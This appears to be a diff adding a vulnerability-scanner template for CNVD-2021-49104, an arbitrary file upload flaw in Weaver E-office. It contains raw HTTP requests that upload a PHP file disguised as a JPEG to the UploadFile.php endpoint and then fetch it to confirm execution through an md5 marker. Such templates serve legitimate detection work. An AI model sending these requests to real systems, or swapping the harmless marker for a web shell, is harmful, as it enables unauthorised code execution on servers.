@@ -1,0 +1,43 @@
+id: CNVD-2021-49104
+
+info:
+  name: 泛微(Weaver) E-office - 任意文件上传(CNVD-2021-49104)
+  author: pikpikcu
+  severity: critical
+  description: The Pan Wei Micro E-office version running allows arbitrary file uploads from a remote attacker.
+  remediation: Pan Wei has released an update to resolve this vulnerability.
+  tags: office
+  metadata:
+    max-request: 2
+
+http:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="{{randstr}}.php"
+        Content-Type: image/jpeg
+
+        <?php echo md5('CNVD-2021-49104');?>
+
+        --e64bdf16c554bbc109cecef6451c26a4--
+
+      - |
+        GET /images/logo/logo-eoffice.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "94d01a2324ce38a2e29a629c54190f67"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by cs on 2022/02/28
